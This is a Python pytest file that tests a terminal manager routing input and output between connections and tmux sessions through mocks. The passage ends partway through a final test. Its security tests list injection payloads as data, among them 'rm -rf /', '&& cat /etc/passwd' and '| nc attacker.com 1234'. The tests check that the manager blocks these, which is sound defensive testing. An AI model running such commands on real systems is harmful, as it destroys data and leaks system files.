"""End-to-end tests for terminal I/O with mocked interfaces.

These tests trace the complete lifecycle of packets through the terminal I/O
system, covering every scenario, edge case, and error possibility.

The tests use dependency injection with mock objects to simulate:
- Session provider (session lookup)
- Tmux executor (send-keys)
- Output capture (pipe-pane)
- Event delivery (send to connections)
"""

import asyncio
import time
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from ras.proto.ras import (
    AttachTerminal,
    DetachTerminal,
    KeyType,
    SpecialKey,
    TerminalCommand,
    TerminalInput,
    TerminalResize,
)
from ras.terminal.buffer import CircularBuffer
from ras.terminal.manager import TerminalManager


# =============================================================================
# TEST FIXTURES - Mocked Components
# =============================================================================


class MockSessionProvider:
    """Mock session provider for E2E testing."""

    def __init__(self):
        self._sessions: dict[str, dict] = {}

    def get_session(self, session_id: str) -> dict | None:
        return self._sessions.get(session_id)

    def add_session(
        self, session_id: str, tmux_name: str, status: str = "ACTIVE"
    ) -> None:
        self._sessions[session_id] = {"tmux_name": tmux_name, "status": status}

    def remove_session(self, session_id: str) -> None:
        self._sessions.pop(session_id, None)

    def set_status(self, session_id: str, status: str) -> None:
        if session_id in self._sessions:
            self._sessions[session_id]["status"] = status


class MockTmuxExecutor:
    """Mock tmux executor that records all sent keys."""

    def __init__(self):
        self.sent_keys: list[tuple[str, bytes, bool]] = []
        self.should_fail = False
        self.fail_count = 0

    async def send_keys(
        self, tmux_name: str, keys: bytes, literal: bool = True
    ) -> None:
        if self.should_fail:
            self.fail_count += 1
            raise RuntimeError("Simulated tmux failure")
        self.sent_keys.append((tmux_name, keys, literal))

    def clear(self) -> None:
        self.sent_keys.clear()
        self.fail_count = 0


class EventCollector:
    """Collects events sent to connections."""

    def __init__(self):
        self.events: list[tuple[str, object]] = []

    def send_event(self, connection_id: str, event: object) -> None:
        self.events.append((connection_id, event))

    def clear(self) -> None:
        self.events.clear()

    def get_events_for(self, connection_id: str) -> list:
        return [e for cid, e in self.events if cid == connection_id]

    def _get_event_type(self, event) -> str:
        """Get the type of terminal event using betterproto's which_one_of."""
        import betterproto

        field_name, _ = betterproto.which_one_of(event, "event")
        return field_name

    def get_attached_events(self) -> list:
        return [(cid, e) for cid, e in self.events if self._get_event_type(e) == "attached"]

    def get_detached_events(self) -> list:
        return [(cid, e) for cid, e in self.events if self._get_event_type(e) == "detached"]

    def get_output_events(self) -> list:
        return [(cid, e) for cid, e in self.events if self._get_event_type(e) == "output"]

    def get_error_events(self) -> list:
        return [(cid, e) for cid, e in self.events if self._get_event_type(e) == "error"]

    def get_skipped_events(self) -> list:
        return [(cid, e) for cid, e in self.events if self._get_event_type(e) == "skipped"]


@pytest.fixture
def mock_session_provider():
    """Create mock session provider."""
    return MockSessionProvider()


@pytest.fixture
def mock_tmux_executor():
    """Create mock tmux executor."""
    return MockTmuxExecutor()


@pytest.fixture
def event_collector():
    """Create event collector."""
    return EventCollector()


@pytest.fixture
def manager(mock_session_provider, mock_tmux_executor, event_collector):
    """Create terminal manager with mocked dependencies."""
    return TerminalManager(
        session_provider=mock_session_provider,
        tmux_executor=mock_tmux_executor,
        send_event=event_collector.send_event,
        buffer_size_kb=10,  # Small buffer for testing eviction
        chunk_interval_ms=50,
    )


# =============================================================================
# E2E FLOW TESTS - Happy Paths
# =============================================================================


class TestE2EAttachFlow:
    """E2E tests for attach flow."""

    @pytest.mark.asyncio
    async def test_attach_success_lifecycle(
        self, manager, mock_session_provider, event_collector
    ):
        """Test successful attach: command -> validation -> capture start -> event."""
        # Setup: Add a valid session
        mock_session_provider.add_session("abc123def456", "ras-test-session")

        # Act: Send attach command
        with patch("ras.terminal.manager.OutputCapture") as mock_capture_class:
            mock_capture = AsyncMock()
            mock_capture.start = AsyncMock()
            mock_capture_class.return_value = mock_capture

            command = TerminalCommand(
                attach=AttachTerminal(session_id="abc123def456", from_sequence=0)
            )
            await manager.handle_command("conn1", command)

        # Assert: Events sent
        attached = event_collector.get_attached_events()
        assert len(attached) == 1
        conn_id, event = attached[0]
        assert conn_id == "conn1"
        assert event.attached.session_id == "abc123def456"
        assert event.attached.cols == 80
        assert event.attached.rows == 24

        # Assert: Buffer created
        assert "abc123def456" in manager._buffers

        # Assert: Connection tracked
        assert "conn1" in manager._attachments["abc123def456"]

    @pytest.mark.asyncio
    async def test_attach_multiple_connections_same_session(
        self, manager, mock_session_provider, event_collector
    ):
        """Multiple connections can attach to the same session."""
        mock_session_provider.add_session("abc123def456", "ras-test-session")

        with patch("ras.terminal.manager.OutputCapture") as mock_capture_class:
            mock_capture = AsyncMock()
            mock_capture.start = AsyncMock()
            mock_capture_class.return_value = mock_capture

            # Attach first connection
            cmd1 = TerminalCommand(
                attach=AttachTerminal(session_id="abc123def456", from_sequence=0)
            )
            await manager.handle_command("conn1", cmd1)

            # Attach second connection
            cmd2 = TerminalCommand(
                attach=AttachTerminal(session_id="abc123def456", from_sequence=0)
            )
            await manager.handle_command("conn2", cmd2)

        # Both should receive attached events
        attached = event_collector.get_attached_events()
        assert len(attached) == 2

        # Both tracked
        assert manager.get_attachment_count("abc123def456") == 2

    @pytest.mark.asyncio
    async def test_attach_with_sequence_reconnection(
        self, manager, mock_session_provider, event_collector
    ):
        """Attach with from_sequence sends buffered output."""
        mock_session_provider.add_session("abc123def456", "ras-test-session")

        # Pre-populate buffer with data
        manager._buffers["abc123def456"] = CircularBuffer(max_size_bytes=10000)
        manager._buffers["abc123def456"].append(b"chunk1")
        manager._buffers["abc123def456"].append(b"chunk2")
        manager._buffers["abc123def456"].append(b"chunk3")

        with patch("ras.terminal.manager.OutputCapture") as mock_capture_class:
            mock_capture = AsyncMock()
            mock_capture.start = AsyncMock()
            mock_capture_class.return_value = mock_capture

            # Attach requesting from sequence 1
            command = TerminalCommand(
                attach=AttachTerminal(session_id="abc123def456", from_sequence=1)
            )
            await manager.handle_command("conn1", command)

        # Should get attached + buffered chunks (seq 1 and 2)
        events = event_collector.events
        # First event: attached
        assert events[0][1].attached.session_id == "abc123def456"
        # Next events: buffered output
        output_events = event_collector.get_output_events()
        assert len(output_events) == 2
        assert output_events[0][1].output.data == b"chunk2"
        assert output_events[1][1].output.data == b"chunk3"

    @pytest.mark.asyncio
    async def test_attach_with_from_sequence_zero_sends_all_buffered_output(
        self, manager, mock_session_provider, event_collector
    ):
        """Attach with from_sequence=0 sends all buffered output from beginning."""
        mock_session_provider.add_session("abc123def456", "ras-test-session")

        # Pre-populate buffer with data
        manager._buffers["abc123def456"] = CircularBuffer(max_size_bytes=10000)
        manager._buffers["abc123def456"].append(b"first")
        manager._buffers["abc123def456"].append(b"second")
        manager._buffers["abc123def456"].append(b"third")

        with patch("ras.terminal.manager.OutputCapture") as mock_capture_class:
            mock_capture = AsyncMock()
            mock_capture.start = AsyncMock()
            mock_capture_class.return_value = mock_capture

            # Attach requesting from sequence 0 (all output from beginning)
            command = TerminalCommand(
                attach=AttachTerminal(session_id="abc123def456", from_sequence=0)
            )
            await manager.handle_command("conn1", command)

        # Should get attached + ALL buffered chunks
        events = event_collector.events
        # First event: attached
        assert events[0][1].attached.session_id == "abc123def456"
        # Next events: all buffered output starting from sequence 0
        output_events = event_collector.get_output_events()
        assert len(output_events) == 3
        assert output_events[0][1].output.data == b"first"
        assert output_events[0][1].output.sequence == 0
        assert output_events[1][1].output.data == b"second"
        assert output_events[1][1].output.sequence == 1
        assert output_events[2][1].output.data == b"third"
        assert output_events[2][1].output.sequence == 2


class TestE2EInputFlow:
    """E2E tests for input flow."""

    @pytest.mark.asyncio
    async def test_input_data_lifecycle(
        self, manager, mock_session_provider, mock_tmux_executor, event_collector
    ):
        """Test data input: command -> validation -> tmux send-keys."""
        mock_session_provider.add_session("abc123def456", "ras-test-session")

        # Setup attachment
        manager._attachments["abc123def456"] = {"conn1"}

        # Send input
        command = TerminalCommand(
            input=TerminalInput(session_id="abc123def456", data=b"ls -la\r")
        )
        await manager.handle_command("conn1", command)

        # Assert: Keys sent to tmux
        assert len(mock_tmux_executor.sent_keys) == 1
        tmux_name, keys, literal = mock_tmux_executor.sent_keys[0]
        assert tmux_name == "ras-test-session"
        assert keys == b"ls -la\r"
        assert literal is True  # Sent literally (no shell expansion)

    @pytest.mark.asyncio
    async def test_special_key_input_lifecycle(
        self, manager, mock_session_provider, mock_tmux_executor
    ):
        """Test special key input: Ctrl+C -> escape sequence to tmux."""
        mock_session_provider.add_session("abc123def456", "ras-test-session")
        manager._attachments["abc123def456"] = {"conn1"}

        command = TerminalCommand(
            input=TerminalInput(
                session_id="abc123def456",
                special=SpecialKey(key=KeyType.KEY_CTRL_C, modifiers=0),
            )
        )
        await manager.handle_command("conn1", command)

        # Assert: ETX (0x03) sent
        assert len(mock_tmux_executor.sent_keys) == 1
        assert mock_tmux_executor.sent_keys[0][1] == b"\x03"

    @pytest.mark.asyncio
    async def test_arrow_key_input_lifecycle(
        self, manager, mock_session_provider, mock_tmux_executor
    ):
        """Test arrow key input: Up -> escape sequence to tmux."""
        mock_session_provider.add_session("abc123def456", "ras-test-session")
        manager._attachments["abc123def456"] = {"conn1"}

        command = TerminalCommand(
            input=TerminalInput(
                session_id="abc123def456",
                special=SpecialKey(key=KeyType.KEY_UP, modifiers=0),
            )
        )
        await manager.handle_command("conn1", command)

        # Assert: CSI A sent
        assert mock_tmux_executor.sent_keys[0][1] == b"\x1b[A"

    @pytest.mark.asyncio
    async def test_function_key_input_lifecycle(
        self, manager, mock_session_provider, mock_tmux_executor
    ):
        """Test function key input: F1 -> escape sequence to tmux."""
        mock_session_provider.add_session("abc123def456", "ras-test-session")
        manager._attachments["abc123def456"] = {"conn1"}

        command = TerminalCommand(
            input=TerminalInput(
                session_id="abc123def456",
                special=SpecialKey(key=KeyType.KEY_F1, modifiers=0),
            )
        )
        await manager.handle_command("conn1", command)

        # Assert: SS3 P sent
        assert mock_tmux_executor.sent_keys[0][1] == b"\x1bOP"

    @pytest.mark.asyncio
    async def test_resize_input_is_noop(
        self, manager, mock_session_provider, mock_tmux_executor
    ):
        """Test resize input is no-op (fixed 80x24)."""
        mock_session_provider.add_session("abc123def456", "ras-test-session")
        manager._attachments["abc123def456"] = {"conn1"}

        command = TerminalCommand(
            input=TerminalInput(
                session_id="abc123def456",
                resize=TerminalResize(cols=120, rows=40),
            )
        )
        await manager.handle_command("conn1", command)

        # Assert: No keys sent
        assert len(mock_tmux_executor.sent_keys) == 0


class TestE2EOutputFlow:
    """E2E tests for output flow."""

    @pytest.mark.asyncio
    async def test_output_broadcast_to_all_connections(
        self, manager, mock_session_provider, event_collector
    ):
        """Output captured from tmux is broadcast to all attached connections."""
        mock_session_provider.add_session("abc123def456", "ras-test-session")

        # Setup multiple attachments
        manager._attachments["abc123def456"] = {"conn1", "conn2", "conn3"}
        manager._buffers["abc123def456"] = CircularBuffer()

        # Simulate output capture callback
        manager._on_output("abc123def456", b"Hello, World!")

        # Assert: All connections received output
        output_events = event_collector.get_output_events()
        assert len(output_events) == 3

        # All have same content
        for conn_id, event in output_events:
            assert event.output.data == b"Hello, World!"
            assert event.output.session_id == "abc123def456"
            assert event.output.sequence == 0

    @pytest.mark.asyncio
    async def test_output_stored_in_buffer_with_sequence(
        self, manager, mock_session_provider
    ):
        """Output is stored in buffer with incrementing sequence numbers."""
        mock_session_provider.add_session("abc123def456", "ras-test-session")

        manager._attachments["abc123def456"] = {"conn1"}
        manager._buffers["abc123def456"] = CircularBuffer()

        # Simulate multiple outputs
        manager._on_output("abc123def456", b"line1\n")
        manager._on_output("abc123def456", b"line2\n")
        manager._on_output("abc123def456", b"line3\n")

        # Assert: Buffer has 3 chunks with correct sequences
        buffer = manager._buffers["abc123def456"]
        assert buffer.current_sequence == 3

        chunks, _ = buffer.get_from_sequence(0)
        assert len(chunks) == 3
        assert chunks[0].sequence == 0
        assert chunks[1].sequence == 1
        assert chunks[2].sequence == 2


class TestE2EDetachFlow:
    """E2E tests for detach flow."""

    @pytest.mark.asyncio
    async def test_detach_success_lifecycle(
        self, manager, mock_session_provider, event_collector
    ):
        """Test detach: command -> remove attachment -> event."""
        mock_session_provider.add_session("abc123def456", "ras-test-session")
        manager._attachments["abc123def456"] = {"conn1", "conn2"}

        command = TerminalCommand(
            detach=DetachTerminal(session_id="abc123def456")
        )
        await manager.handle_command("conn1", command)

        # Assert: Detached event sent
        detached = event_collector.get_detached_events()
        assert len(detached) == 1
        assert detached[0][0] == "conn1"
        assert detached[0][1].detached.reason == "user_request"

        # Assert: Connection removed from attachments
        assert "conn1" not in manager._attachments["abc123def456"]
        assert "conn2" in manager._attachments["abc123def456"]

    @pytest.mark.asyncio
    async def test_detach_last_connection_stops_capture(
        self, manager, mock_session_provider, event_collector
    ):
        """Detaching last connection stops output capture."""
        mock_session_provider.add_session("abc123def456", "ras-test-session")

        manager._attachments["abc123def456"] = {"conn1"}
        mock_capture = AsyncMock()
        mock_capture.stop = AsyncMock()
        manager._captures["abc123def456"] = mock_capture

        command = TerminalCommand(
            detach=DetachTerminal(session_id="abc123def456")
        )
        await manager.handle_command("conn1", command)

        # Assert: Capture stopped
        mock_capture.stop.assert_called_once()
        assert "abc123def456" not in manager._captures


# =============================================================================
# E2E ERROR SCENARIOS
# =============================================================================


class TestE2EErrorScenarios:
    """E2E tests for error scenarios."""

    @pytest.mark.asyncio
    async def test_attach_invalid_session_id(self, manager, event_collector):
        """Invalid session ID format returns error."""
        command = TerminalCommand(
            attach=AttachTerminal(session_id="invalid", from_sequence=0)
        )
        await manager.handle_command("conn1", command)

        errors = event_collector.get_error_events()
        assert len(errors) == 1
        assert errors[0][1].error.error_code == "INVALID_SESSION_ID"

    @pytest.mark.asyncio
    async def test_attach_path_traversal_session_id(self, manager, event_collector):
        """Path traversal in session ID returns error."""
        command = TerminalCommand(
            attach=AttachTerminal(session_id="../etc/passwd", from_sequence=0)
        )
        await manager.handle_command("conn1", command)

        errors = event_collector.get_error_events()
        assert len(errors) == 1
        assert errors[0][1].error.error_code == "INVALID_SESSION_ID"

    @pytest.mark.asyncio
    async def test_attach_null_byte_session_id(self, manager, event_collector):
        """Null byte in session ID returns error."""
        command = TerminalCommand(
            attach=AttachTerminal(session_id="abc\x00def456", from_sequence=0)
        )
        await manager.handle_command("conn1", command)

        errors = event_collector.get_error_events()
        assert len(errors) == 1
        assert errors[0][1].error.error_code == "INVALID_SESSION_ID"

    @pytest.mark.asyncio
    async def test_attach_nonexistent_session(
        self, manager, mock_session_provider, event_collector
    ):
        """Attaching to nonexistent session returns error."""
        # Session not added to provider
        command = TerminalCommand(
            attach=AttachTerminal(session_id="nonexist0000", from_sequence=0)
        )
        await manager.handle_command("conn1", command)

        errors = event_collector.get_error_events()
        assert len(errors) == 1
        assert errors[0][1].error.error_code == "SESSION_NOT_FOUND"

    @pytest.mark.asyncio
    async def test_attach_killing_session(
        self, manager, mock_session_provider, event_collector
    ):
        """Attaching to session being killed returns error."""
        mock_session_provider.add_session(
            "killing00000", "ras-killing", status="KILLING"
        )

        command = TerminalCommand(
            attach=AttachTerminal(session_id="killing00000", from_sequence=0)
        )
        await manager.handle_command("conn1", command)

        errors = event_collector.get_error_events()
        assert len(errors) == 1
        assert errors[0][1].error.error_code == "SESSION_KILLING"

    @pytest.mark.asyncio
    async def test_attach_pipe_pane_failure(
        self, manager, mock_session_provider, event_collector
    ):
        """Pipe-pane setup failure returns error."""
        mock_session_provider.add_session("abc123def456", "ras-test-session")

        with patch("ras.terminal.manager.OutputCapture") as mock_capture_class:
            mock_capture = AsyncMock()
            mock_capture.start = AsyncMock(
                side_effect=RuntimeError("pipe-pane failed")
            )
            mock_capture_class.return_value = mock_capture

            command = TerminalCommand(
                attach=AttachTerminal(session_id="abc123def456", from_sequence=0)
            )
            await manager.handle_command("conn1", command)

        errors = event_collector.get_error_events()
        assert len(errors) == 1
        assert errors[0][1].error.error_code == "PIPE_SETUP_FAILED"

    @pytest.mark.asyncio
    async def test_input_not_attached(
        self, manager, mock_session_provider, event_collector
    ):
        """Input when not attached returns error."""
        mock_session_provider.add_session("abc123def456", "ras-test-session")
        # Note: Not setting up attachment

        command = TerminalCommand(
            input=TerminalInput(session_id="abc123def456", data=b"test")
        )
        await manager.handle_command("conn1", command)

        errors = event_collector.get_error_events()
        assert len(errors) == 1
        assert errors[0][1].error.error_code == "NOT_ATTACHED"

    @pytest.mark.asyncio
    async def test_input_session_not_found_after_attach(
        self, manager, mock_session_provider, event_collector
    ):
        """Input when session removed after attach returns error."""
        # Attachment exists but session was removed
        manager._attachments["removed00000"] = {"conn1"}

        command = TerminalCommand(
            input=TerminalInput(session_id="removed00000", data=b"test")
        )
        await manager.handle_command("conn1", command)

        errors = event_collector.get_error_events()
        assert len(errors) == 1
        assert errors[0][1].error.error_code == "SESSION_NOT_FOUND"

    @pytest.mark.asyncio
    async def test_input_too_large(
        self, manager, mock_session_provider, event_collector
    ):
        """Input exceeding max size returns error."""
        mock_session_provider.add_session("abc123def456", "ras-test-session")
        manager._attachments["abc123def456"] = {"conn1"}

        command = TerminalCommand(
            input=TerminalInput(session_id="abc123def456", data=b"x" * 100000)
        )
        await manager.handle_command("conn1", command)

        errors = event_collector.get_error_events()
        assert len(errors) == 1
        assert errors[0][1].error.error_code == "INPUT_TOO_LARGE"

    @pytest.mark.asyncio
    async def test_input_rate_limited(
        self, manager, mock_session_provider, mock_tmux_executor, event_collector
    ):
        """Input exceeding rate limit returns error."""
        mock_session_provider.add_session("abc123def456", "ras-test-session")
        manager._attachments["abc123def456"] = {"conn1"}

        # Send 100 inputs (at limit)
        for _ in range(100):
            command = TerminalCommand(
                input=TerminalInput(session_id="abc123def456", data=b"x")
            )
            await manager.handle_command("conn1", command)

        # Clear events
        event_collector.clear()

        # 101st should be rate limited
        command = TerminalCommand(
            input=TerminalInput(session_id="abc123def456", data=b"x")
        )
        await manager.handle_command("conn1", command)

        errors = event_collector.get_error_events()
        assert len(errors) == 1
        assert errors[0][1].error.error_code == "RATE_LIMITED"

    @pytest.mark.asyncio
    async def test_input_tmux_failure(
        self, manager, mock_session_provider, mock_tmux_executor, event_collector
    ):
        """Tmux send-keys failure returns error."""
        mock_session_provider.add_session("abc123def456", "ras-test-session")
        manager._attachments["abc123def456"] = {"conn1"}
        mock_tmux_executor.should_fail = True

        command = TerminalCommand(
            input=TerminalInput(session_id="abc123def456", data=b"test")
        )
        await manager.handle_command("conn1", command)

        errors = event_collector.get_error_events()
        assert len(errors) == 1
        assert errors[0][1].error.error_code == "PIPE_ERROR"


# =============================================================================
# E2E SESSION LIFECYCLE TESTS
# =============================================================================


class TestE2ESessionLifecycle:
    """E2E tests for session lifecycle events."""

    @pytest.mark.asyncio
    async def test_session_killed_notifies_all_attached(
        self, manager, event_collector
    ):
        """Session killed notifies all attached connections."""
        manager._attachments["abc123def456"] = {"conn1", "conn2", "conn3"}
        manager._buffers["abc123def456"] = CircularBuffer()

        await manager.on_session_killed("abc123def456")

        # All connections receive detached event
        detached = event_collector.get_detached_events()
        assert len(detached) == 3
        for conn_id, event in detached:
            assert event.detached.session_id == "abc123def456"
            assert event.detached.reason == "session_killed"

    @pytest.mark.asyncio
    async def test_session_killed_cleans_up_resources(self, manager):
        """Session killed cleans up all resources."""
        manager._attachments["abc123def456"] = {"conn1"}
        manager._buffers["abc123def456"] = CircularBuffer()
        mock_capture = AsyncMock()
        mock_capture.stop = AsyncMock()
        manager._captures["abc123def456"] = mock_capture

        await manager.on_session_killed("abc123def456")

        # Resources cleaned up
        assert "abc123def456" not in manager._attachments
        assert "abc123def456" not in manager._buffers
        assert "abc123def456" not in manager._captures
        mock_capture.stop.assert_called_once()

    @pytest.mark.asyncio
    async def test_connection_closed_removes_from_all_sessions(self, manager):
        """Connection closed removes from all attached sessions."""
        manager._attachments["session1"] = {"conn1", "conn2"}
        manager._attachments["session2"] = {"conn1", "conn3"}
        manager._attachments["session3"] = {"conn2", "conn3"}

        await manager.on_connection_closed("conn1")

        # conn1 removed from all sessions
        assert "conn1" not in manager._attachments["session1"]
        assert "conn1" not in manager._attachments["session2"]
        # Others still present
        assert "conn2" in manager._attachments["session1"]
        assert "conn3" in manager._attachments["session2"]

    @pytest.mark.asyncio
    async def test_connection_closed_stops_capture_when_last(self, manager):
        """Connection closed stops capture when last for session."""
        manager._attachments["session1"] = {"conn1"}  # Only attachment
        mock_capture = AsyncMock()
        mock_capture.stop = AsyncMock()
        manager._captures["session1"] = mock_capture

        await manager.on_connection_closed("conn1")

        # Capture stopped
        mock_capture.stop.assert_called_once()


# =============================================================================
# E2E BUFFER OVERFLOW TESTS
# =============================================================================


class TestE2EBufferOverflow:
    """E2E tests for buffer overflow and eviction."""

    @pytest.mark.asyncio
    async def test_buffer_overflow_evicts_old_data(
        self, manager, mock_session_provider, event_collector
    ):
        """Buffer overflow evicts old data and reports skipped sequences."""
        mock_session_provider.add_session("abc123def456", "ras-test-session")

        # Create small buffer (100 bytes)
        manager._buffers["abc123def456"] = CircularBuffer(max_size_bytes=100)

        # Fill buffer to cause eviction
        buffer = manager._buffers["abc123def456"]
        for i in range(20):
            buffer.append(f"chunk{i:02d}".encode())  # ~7 bytes each = 140 bytes total

        # Get current buffer state (some sequences were evicted)
        start_seq = buffer.start_sequence
        assert start_seq > 0, "Buffer should have evicted some sequences"

        # Reconnect requesting from sequence 5 (which was evicted)
        with patch("ras.terminal.manager.OutputCapture") as mock_capture_class:
            mock_capture = AsyncMock()
            mock_capture.start = AsyncMock()
            mock_capture_class.return_value = mock_capture

            command = TerminalCommand(
                attach=AttachTerminal(session_id="abc123def456", from_sequence=5)
            )
            await manager.handle_command("conn1", command)

        # Should receive skipped event indicating data loss
        skipped = event_collector.get_skipped_events()
        assert len(skipped) == 1
        assert skipped[0][1].skipped.from_sequence == 5

    @pytest.mark.asyncio
    async def test_reconnect_with_valid_sequence_no_skip(
        self, manager, mock_session_provider, event_collector
    ):
        """Reconnect with valid sequence doesn't report skipped."""
        mock_session_provider.add_session("abc123def456", "ras-test-session")

        # Create buffer with data
        manager._buffers["abc123def456"] = CircularBuffer(max_size_bytes=10000)
        buffer = manager._buffers["abc123def456"]
        for i in range(5):
            buffer.append(f"chunk{i}".encode())

        with patch("ras.terminal.manager.OutputCapture") as mock_capture_class:
            mock_capture = AsyncMock()
            mock_capture.start = AsyncMock()
            mock_capture_class.return_value = mock_capture

            # Request from sequence 3 (valid)
            command = TerminalCommand(
                attach=AttachTerminal(session_id="abc123def456", from_sequence=3)
            )
            await manager.handle_command("conn1", command)

        # No skipped events
        skipped = event_collector.get_skipped_events()
        assert len(skipped) == 0

        # Should get chunks 3, 4
        output = event_collector.get_output_events()
        assert len(output) == 2


# =============================================================================
# E2E SHUTDOWN TESTS
# =============================================================================


class TestE2EShutdown:
    """E2E tests for graceful shutdown."""

    @pytest.mark.asyncio
    async def test_shutdown_stops_all_captures(self, manager):
        """Shutdown stops all active captures."""
        # Setup multiple captures
        mock_capture1 = AsyncMock()
        mock_capture1.stop = AsyncMock()
        mock_capture2 = AsyncMock()
        mock_capture2.stop = AsyncMock()

        manager._captures["session1"] = mock_capture1
        manager._captures["session2"] = mock_capture2
        manager._buffers["session1"] = CircularBuffer()
        manager._buffers["session2"] = CircularBuffer()
        manager._attachments["session1"] = {"conn1"}
        manager._attachments["session2"] = {"conn2"}

        await manager.shutdown()

        # All captures stopped
        mock_capture1.stop.assert_called_once()
        mock_capture2.stop.assert_called_once()

        # All state cleared
        assert len(manager._captures) == 0
        assert len(manager._buffers) == 0
        assert len(manager._attachments) == 0


# =============================================================================
# E2E SECURITY TESTS
# =============================================================================


class TestE2ESecurity:
    """E2E security tests."""

    @pytest.mark.asyncio
    @pytest.mark.parametrize(
        "session_id",
        [
            "../../../etc/passwd",
            "/etc/passwd",
            "abc\x00def456",
            "abc; rm -rf /",
            "abc`id`def456",
            "abc$(id)def456",
            "abc\nrm -rf /",
        ],
    )
    async def test_session_id_injection_rejected(
        self, manager, event_collector, session_id
    ):
        """All command injection attempts in session ID are rejected."""
        command = TerminalCommand(
            attach=AttachTerminal(session_id=session_id, from_sequence=0)
        )
        await manager.handle_command("conn1", command)

        errors = event_collector.get_error_events()
        assert len(errors) == 1
        assert errors[0][1].error.error_code == "INVALID_SESSION_ID"

    @pytest.mark.asyncio
    @pytest.mark.parametrize(
        "data",
        [
            b"; rm -rf /",
            b"&& cat /etc/passwd",
            b"| nc attacker.com 1234",
            b"`id`",
            b"$(whoami)",
            b"\n rm -rf /",
            b"\x00; id",
        ],
    )
    async def test_input_injection_sent_literally(
        self, manager, mock_session_provider, mock_tmux_executor, data
    ):
        """Command injection in input data is sent literally (not executed)."""
        mock_session_provider.add_session("abc123def456", "ras-test-session")
        manager._attachments["abc123def456"] = {"conn1"}

        command = TerminalCommand(
            input=TerminalInput(session_id="abc123def456", data=data)
        )
        await manager.handle_command("conn1", command)

        # Data sent literally to tmux
        assert len(mock_tmux_executor.sent_keys) == 1
        assert mock_tmux_executor.sent_keys[0][1] == data
        assert mock_tmux_executor.sent_keys[0][2] is True  # literal=True


# =============================================================================
# E2E COMPLETE FLOW TESTS
# =============================================================================


class TestE2ECompleteFlows:
    """Complete end-to-end flow tests simulating real usage."""

    @pytest.mark.asyncio
    async def test_complete_session_interaction_flow(
        self, manager, mock_session_provider, mock_tmux_executor, event_collector
    ):
        """Complete flow: attach -> input -> output -> detach."""
        mock_session_provider.add_session("abc123def456", "ras-test-session")

        with patch("ras.terminal.manager.OutputCapture") as mock_capture_class:
            mock_capture = AsyncMock()
            mock_capture.start = AsyncMock()
            mock_capture.stop = AsyncMock()
            mock_capture_class.return_value = mock_capture

            # 1. Attach
            await manager.handle_command(
                "conn1",
                TerminalCommand(
                    attach=AttachTerminal(session_id="abc123def456", from_sequence=0)
                ),
            )
            assert len(event_collector.get_attached_events()) == 1

            # 2. Send input
            await manager.handle_command(
                "conn1",
                TerminalCommand(
                    input=TerminalInput(session_id="abc123def456", data=b"ls\r")
                ),
            )
            assert mock_tmux_executor.sent_keys[-1][1] == b"ls\r"

            # 3. Receive output (simulated)
            manager._on_output("abc123def456", b"file1\nfile2\n")
            output_events = event_collector.get_output_events()
            assert len(output_events) == 1
            assert output_events[0][1].output.data == b"file1\nfile2\n"

            # 4. Send special key (Ctrl+C)
            await manager.handle_command(
                "conn1",
                TerminalCommand(
                    input=TerminalInput(
                        session_id="abc123def456",
                        special=SpecialKey(key=KeyType.KEY_CTRL_C, modifiers=0),
                    )
                ),
            )
            assert mock_tmux_executor.sent_keys[-1][1] == b"\x03"

            # 5. Detach
            await manager.handle_command(
                "conn1",
                TerminalCommand(detach=DetachTerminal(session_id="abc123def456")),
            )
            detached = event_collector.get_detached_events()
            assert len(detached) == 1
            assert detached[0][1].detached.reason == "user_request"

    @pytest.mark.asyncio
    async def test_reconnection_flow_with_buffer_replay(
        self, manager, mock_session_provider, event_collector
    ):
        """Reconnection flow with buffer replay."""
        mock_session_provider.add_session("abc123def456", "ras-test-session")

        with patch("ras.terminal.manager.OutputCapture") as mock_capture_class:
            mock_capture = AsyncMock()
            mock_capture.start = AsyncMock()
            mock_capture.stop = AsyncMock()
            mock_capture_class.return_value = mock_capture

            # 1. First connection attaches
            await manager.handle_command(
                "conn1",
                TerminalCommand(
                    attach=AttachTerminal(session_id="abc123def456", from_sequence=0)
                ),
            )

            # 2. Output arrives (sequences 0, 1, 2)
            manager._on_output("abc123def456", b"output0")
            manager._on_output("abc123def456", b"output1")
            manager._on_output("abc123def456", b"output2")

            # 3. Connection drops (detach)
            await manager.handle_command(
                "conn1",
                TerminalCommand(detach=DetachTerminal(session_id="abc123def456")),
            )

            # 4. More output while disconnected (seq 3, 4)
            manager._on_output("abc123def456", b"output3")
            manager._on_output("abc123def456", b"output4")

            event_collector.clear()

            # 5. Reconnect requesting from sequence 3
            await manager.handle_command(
                "conn1",
                TerminalCommand(
                    attach=AttachTerminal(session_id="abc123def456", from_sequence=3)
                ),
            )

            # Should get attached event + output 3, 4
            attached = event_collector.get_attached_events()
            assert len(attached) == 1

            output = event_collector.get_output_events()
            assert len(output) == 2
            assert output[0][1].output.sequence == 3
            assert output[1][1].output.sequence == 4

    @pytest.mark.asyncio
    async def test_multiple_sessions_isolation(
        self, manager, mock_session_provider, mock_tmux_executor, event_collector
    ):
        """Multiple sessions remain isolated."""
        mock_session_provider.add_session("session1ab00", "ras-session1")
        mock_session_provider.add_session("session2ab00", "ras-session2")

        with patch("ras.terminal.manager.OutputCapture") as mock_capture_class:
            mock_capture = AsyncMock()
            mock_capture.start = AsyncMock()
            mock_capture_class.return_value = mock_capture

            # Attach different connections to different sessions
            await manager.handle_command(
                "conn1",
                TerminalCommand(
                    attach=AttachTerminal(session_id="session1ab00", from_sequence=0)
                ),
            )
            await manager.handle_command(
                "conn2",
                TerminalCommand(
                    attach=AttachTerminal(session_id="session2ab00", from_sequence=0)
                ),
            )

            event_collector.clear()

            # Input to session1
            await manager.handle_command(
                "conn1",
                TerminalCommand(
                    input=TerminalInput(session_id="session1ab00", data=b"session1")
                ),
            )

            # Input to session2
            await manager.handle_command(
                "conn2",
                TerminalCommand(
                    input=TerminalInput(session_id="session2ab00", data=b"session2")
                ),
            )

            # Verify different tmux sessions received input
            assert ("ras-session1", b"session1", True) in mock_tmux_executor.sent_keys
            assert ("ras-session2", b"session2", True) in mock_tmux_executor.sent_keys

            # Output from session1 only goes to conn1
            manager._on_output("session1ab00", b"output1")
            output = event_collector.get_output_events()
            assert len(output) == 1
            assert output[0][0] == "conn1"

            event_collector.clear()

            # Output from session2 only goes to conn2
            manager._on_output("session2ab00", b"output2")
            output = event_collector.get_output_events()
            assert len(output) == 1
            assert output[0][0] == "conn2"

    @pytest.mark.asyncio
    async def test_concurrent_operations(
        self, manager, mock_session_provider, mock_tmux_executor, event_collector
    ):
